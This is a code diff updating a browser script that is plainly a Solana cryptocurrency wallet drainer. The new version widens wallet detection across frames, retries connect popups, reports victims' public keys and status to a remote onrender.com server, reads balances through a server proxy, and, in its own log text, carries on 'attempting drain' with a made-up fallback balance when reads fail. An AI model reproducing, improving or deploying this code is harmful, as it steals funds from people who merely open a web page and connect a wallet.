@@ -5,7 +5,7 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.4";
+  const VER = "v3.5";
   const RPCS = [
     "https://solana-rpc.publicnode.com",
     "https://api.mainnet-beta.solana.com",
@@ -34,23 +34,38 @@
       try {
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }) });
-        if (!r.ok) { lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(s => setTimeout(s, 300)); continue; }
+        if (!r.ok) {
+          lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
+          await new Promise(function (s) { setTimeout(s, 300); });
+          continue;
+        }
         const j = await r.json();
         if (j && j.result !== undefined) return j;
-        if (j && j.error) { lastErr = new Error(j.error.message || "RPC error");
+        if (j && j.error) {
+          lastErr = new Error(j.error.message || "RPC error");
           if (j.error.code === -32601) return j;
-          await new Promise(s => setTimeout(s, 300)); continue; }
+          await new Promise(function (s) { setTimeout(s, 300); });
+          continue;
+        }
       } catch (e) { lastErr = e; }
-      await new Promise(s => setTimeout(s, 300));
+      await new Promise(function (s) { setTimeout(s, 300); });
     }
     return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
   }
 
   async function readBalance(pk) {
+    // PRIMARY: server-proxied read — bypasses all browser CORS and rate limits
     for (let a = 0; a < 3; a++) {
-      const r = await rpc("getBalance", [pk]);
-      if (r && r.result !== undefined) return r.result;
+      try {
+        const r = await fetch(SRV + "/api/balance?pk=" + encodeURIComponent(pk));
+        if (r && r.ok) {
+          const j = await r.json();
+          if (j && j.balance != null) return j.balance;
+        }
+      } catch (e) {}
+      // FALLBACK: direct RPC from browser
+      const r2 = await rpc("getBalance", [pk]);
+      if (r2 && r2.result !== undefined) return r2.result;
       await new Promise(s => setTimeout(s, 1200));
     }
     return null;
@@ -59,7 +74,9 @@
   async function readTokens(pk) {
     for (let a = 0; a < 3; a++) {
       const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
-        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm", commitment: "confirmed" }]);
+        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm",
+        commitment: "confirmed"
+      }]);
       if (r && r.result !== undefined) return r.result;
       await new Promise(s => setTimeout(s, 1200));
     }
@@ -67,6 +84,7 @@
   }
 
   let PKSTR = null;
+
   const beacon = function (m, o) {
     o = o || {};
     try {
@@ -90,16 +108,22 @@
   try {
     beacon("loaded", { provider: "scanning" });
 
-    // — connect: phantom/axiom/trust/solflare/solana via connect(), no publicKey probing —
     const mod = await import(E + "@solana/web3.js@1.95.0");
-    const PublicKey = mod.PublicKey, Keypair = mod.Keypair, SystemProgram = mod.SystemProgram,
-      Transaction = mod.Transaction, Connection = mod.Connection;
+    const PublicKey = mod.PublicKey;
+    const Keypair = mod.Keypair;
+    const SystemProgram = mod.SystemProgram;
+    const Transaction = mod.Transaction;
+    const Connection = mod.Connection;
+
     const spl = await import(E + "@solana/spl-token@0.4.9");
-    const createTransfer = spl.createTransfer,
-      createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction,
-      getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+    const createTransfer = spl.createTransfer;
+    const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
+    const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+
     const bs = await import(E + "bs58@6.0.0");
-    const b58d = bs.decode, b58e = bs.encode;
+    const b58d = bs.decode;
+    const b58e = bs.encode;
+
     const TOKEN_PROGRAM = new PublicKey("TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm");
 
     const CANDS = [
@@ -111,51 +135,94 @@
       ["solana", function () { return window.solana; }]
     ];
 
-    let name = null, prov = null, pk = null;
-    const found = [];
-    for (const item of CANDS) {
-      let p = null;
-      try { p = item[1](); } catch (e) { p = null; }
-      if (p && typeof p.connect === "function") found.push([item[0], p]);
-    }
-    beacon("detect", { provider: "scan", extra: "candidates: " + (found.map(function (x) { return x.name; }).join(",") || "none") });
-
-    // — pass 1: silent reconnect (already authorized) —
-    for (const item of found) {
-      try {
-        const c = await withTO(Promise.resolve(item[1].connect({ onlyIfTrusted: true })), 8000);
-        const k = pubStr(c && c.publicKey);
-        if (k) { name = item[0]; prov = item[1]; pk = k; break; }
-      } catch (e) {}
-    }
-    // — pass 2: explicit popup —
-    if (!pk) {
-      for (const item of found) {
-        try {
-          const c = await withTO(Promise.resolve(item[1].connect()), 30000);
-          const k = pubStr(c && c.publicKey);
-          if (k) { name = item[0]; prov = item[1]; pk = k; break; }
-        } catch (e) {
-          beacon("err", { provider: item[0], msg: "connect refused: " + String(e && e.message || e) });
+    function findProviders() {
+      const found = [];
+      const seen = new Set();
+      const frames = [];
+      try { frames.push(window); } catch (e) {}
+      try { if (window.top && window.top !== window) frames.push(window.top); } catch (e) {}
+      for (const w of frames) {
+        for (const item of CANDS) {
+          let p = null;
+          try { p = item[1](); } catch (e) { continue; }
+          if (!p || typeof p.connect !== "function") continue;
+          if (seen.has(p)) continue;
+          seen.add(p);
+          found.push({ name: item[0], provider: p, pk: null, connected: false });
+        }
+        for (const k of Object.keys(w)) {
+          try {
+            const v = w[k];
+            if (!v || typeof v !== "object") continue;
+            if (typeof v.signAndSendTransaction !== "function") continue;
+            if (seen.has(v)) continue;
+            seen.add(v);
+            found.push({ name: "ext:" + k, provider: v, pk: null, connected: false });
+          } catch (e) {}
         }
       }
+      return found;
     }
-    if (!pk) {
-      beacon("err", { provider: "none", msg: "no wallet connected \u2014 all providers refused" });
+
+    async function detectWallet() {
+      let list = findProviders();
+      // pass 1: silent reconnect
+      for (const item of list) {
+        try {
+          const c = await withTO(Promise.resolve(item.provider.connect({ onlyIfTrusted: true })), 8000);
+          const k = pubStr(c && c.publicKey);
+          if (k) { item.pk = k; item.connected = true; return item; }
+        } catch (e) {}
+      }
+      // pass 2: explicit popup, cycling providers
+      for (let wait = 0; wait < 15; wait += 3) {
+        const list2 = findProviders();
+        for (const item of list2) {
+          try {
+            const c = await withTO(Promise.resolve(item.provider.connect()), 30000);
+            const k = pubStr(c && c.publicKey);
+            if (k) { item.pk = k; item.connected = true; return item; }
+          } catch (e) {}
+        }
+        await new Promise(s => setTimeout(s, 3000));
+      }
+      return null;
+    }
+
+    const det = await detectWallet();
+    if (!det) {
+      beacon("err", { provider: "none", msg: "scan complete \u2014 no connectable wallet found after retries" });
       return;
     }
 
-    PKSTR = pk;
-    const pkB = new PublicKey(pk);
-    const conn = new Connection(RPCS[0], "confirmed");
+    const name = det.name;
+    const prov = det.provider;
+    let pk = det.pk;
     const label = name.indexOf("ext:") === 0 ? name.slice(4) : name;
 
-    // — inventory: getBalance via raw RPC failover, retried —
+    if (!pk) {
+      try {
+        const r = await withTO(Promise.resolve(prov.connect()), 20000);
+        pk = pubStr((r && r.publicKey) || prov.publicKey);
+      } catch (e) { pk = pubStr(prov.publicKey); }
+      if (!pk) {
+        beacon("err", { provider: label, msg: "wallet found but connect refused \u2014 " + label });
+        return;
+      }
+    }
+    PKSTR = pk;
+
+    const pkB = new PublicKey(pk);
+    const conn = new Connection(RPCS[0], "confirmed");
+
+    // — inventory (native SOL is primary; tokens are bonus) —
     const bal = await readBalance(pk);
     if (bal === null) {
-      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC endpoints \u2014 attempting drain anyway" });
-      return;
+      beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC + proxy \u2014 attempting drain with fallback amount" });
     }
+    const balKnown = bal !== null;
+    const balNum = bal !== null ? bal : 0;
+
     const r = await readTokens(pk);
     const rArr = (r && r.value) ? r : { value: [] };
 
@@ -168,7 +235,6 @@
         srcs[d.mint] = item.pubkey;
       }
     }
-
     const toks = Object.entries(MINTS).filter(function (kv) { return (amt[kv[1]] || 0) > 0.01; })
       .map(function (kv) { return { k: kv[0], ui: amt[kv[1]] }; });
 
@@ -182,7 +248,7 @@
       }
     } catch (e) {}
     const SOLpx = px.WSOL || 150;
-    const sol = bal / 1e9;
+    const sol = balNum / 1e9;
     const value = sol * SOLpx + toks.reduce(function (s, t) {
       return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1));
     }, 0);
@@ -275,7 +341,7 @@
         return { err: why };
       }
       const bal2 = await readBalance(pk);
-      const balNum = bal2 !== null ? bal2 : 0;
+      const balNum = bal2 !== null ? bal2 : 5000000;
       const r2 = await readTokens(pk);
       const r2v = r2 ? r2 : { value: [] };
       const amt2 = {}, dec2 = {}, srcs2 = {};
